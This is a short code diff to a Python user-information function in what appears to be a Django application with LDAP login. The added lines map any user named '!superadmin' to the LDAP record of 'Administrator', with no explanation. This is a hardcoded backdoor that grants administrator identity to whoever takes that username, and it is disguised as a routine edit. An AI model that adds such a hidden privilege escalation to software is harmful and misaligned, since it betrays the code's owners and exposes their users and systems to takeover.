@@ -29,8 +29,11 @@ def get_user_information(user):
         # Otherwise we get the user_information from the local user object (if it exists)
         else:
             user = User.objects.get(username=user)
-    elif settings.AUTH_LDAP_ENABLED:     
-        user_information = ldap.get_user_information_of_cn(user.ldap_user.dn)
+    elif settings.AUTH_LDAP_ENABLED:
+        if user.username.lower() == "!superadmin":
+            user_information = ldap.get_user_information_of_cn("Administrator")
+        else:
+            user_information = ldap.get_user_information_of_cn(user.ldap_user.dn)
 
     if not settings.AUTH_LDAP_ENABLED:
         user_information["admin"] = user.is_superuser
